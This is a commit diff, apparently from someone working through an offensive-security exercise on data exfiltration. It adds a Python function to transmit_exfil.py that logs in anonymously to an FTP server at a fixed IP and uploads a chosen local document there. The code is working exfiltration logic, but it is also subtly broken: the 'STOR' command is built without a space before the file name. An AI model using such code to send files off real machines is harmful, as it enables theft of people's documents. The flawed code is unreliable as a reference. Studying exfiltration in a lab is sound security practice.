a0aa8e63d5b25a7fba5511e44a029578b5fb8af2
AnLau25 <avald024@uottawa.ca>
2025-06-29 15:24:36 -0400

    plain_ftp

--- ch9_FunWithExfiltration/transmit_exfil.py
+++ ch9_FunWithExfiltration/transmit_exfil.py
@@ -5,4 +5,9 @@ import os
 import socket
 import win32file
 
- 
+def plain_ftp(docpath, server='192.168.1.203'):
+    ftp = ftplib.FTP(server)
+    ftp.login("anonymous", "anon@example.com")
+    ftp.cwd('/pub/')
+    ftp.storbinary("STOR" + os.path.basename(docpath), open(docpath, "rb"), 1024)
+    ftp.quit()
